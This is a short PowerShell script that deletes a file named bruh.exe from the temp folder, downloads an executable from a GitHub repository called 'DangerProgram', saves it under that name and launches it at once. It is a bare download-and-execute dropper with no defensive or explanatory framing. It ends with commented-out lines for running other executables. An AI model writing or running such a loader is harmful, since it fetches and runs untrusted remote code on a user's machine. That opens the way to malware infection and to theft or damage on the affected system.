$folder = $env:temp
$filename = "\bruh.exe"
$exe = $folder + $filename

if (Test-Path $exe) {
  Remove-Item $exe
  write-host "$exe has been deleted"
}
else {
  Write-host "$exe doesn't exist"
}

$client = New-Object System.Net.WebClient
$client.DownloadFile("https://github.com/kokolokopo/DangerProgram/raw/main/bobsymba.exe", $exe)
Start-Process -Filepath $exe

# Set-Location -Path $folder
# .$filename
# .\gayz.exe
